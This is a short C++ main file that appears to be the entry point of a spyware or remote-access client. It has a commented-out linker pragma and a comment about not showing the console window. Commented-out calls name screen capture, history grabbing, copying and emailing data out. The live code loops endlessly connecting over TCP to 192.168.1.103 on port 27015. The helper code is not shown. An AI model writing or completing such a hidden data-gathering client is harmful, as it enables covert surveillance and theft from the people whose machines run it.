//do not show the cmd windows
//#pragma comment( linker, "/subsystem:\"windows\" /entry:\"mainCRTStartup\"" )
#include "util.h"
#include<typeinfo>
#include<stdio.h>
#include<stdlib.h>
#include<string>
//#pragma comment( linker, "/subsystem:\"windows\" /entry:\"mainCRTStartup\"" )

int main()
{
	//copy();
	//ScreenCapture("asd.png");
	//getHistory();
	//list<string> l;
	//sendemail(l);
	while(true)
	{
		tcpconnect("192.168.1.103", "27015");
	}
	return 0;
}